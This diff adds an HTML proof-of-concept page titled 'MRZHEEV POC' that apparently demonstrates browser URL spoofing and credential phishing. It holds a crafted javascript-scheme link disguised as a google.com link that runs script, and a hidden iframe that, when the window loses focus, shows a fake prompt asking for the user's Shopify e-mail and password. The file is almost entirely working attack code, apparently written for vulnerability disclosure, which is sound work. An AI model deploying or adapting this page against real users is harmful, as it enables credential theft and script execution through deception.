@@ -1,0 +1,33 @@
+<html lang="en-US">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, user-scalable=no">
+	<title>MRZHEEV POC</title>
+	
+	<style>
+		iframe {
+			visibility: hidden;
+		}
+	</style>
+   <script>
+		function redirect() {
+			setTimeout(function() {
+				window.open("http://google.com/load/", "win");
+			}, 1500);
+		}
+   		
+		window.onblur = function() {
+			document.getElementById("iframe").src = "javascript:prompt('In order to access shopify.com\\nyou must first login on your\\nShopify Account.\\n\\nPlease type your e-mail\\nand your password:\\n', 'E-mail / Password.');";
+		}
+	</script>
+</head>
+
+<body>
+   <center>
+		<br>
+		<h1><a href="o.o:@javascript:://google.com/error/%0Aalert(document.domain)//.https://google.com/load/webpage/133337" target="win" onclick="redirect();">Click here to go to https://google.com</a></h1>
+	</center>
+   <iframe id="iframe"></iframe>
+</body
+
+</html>
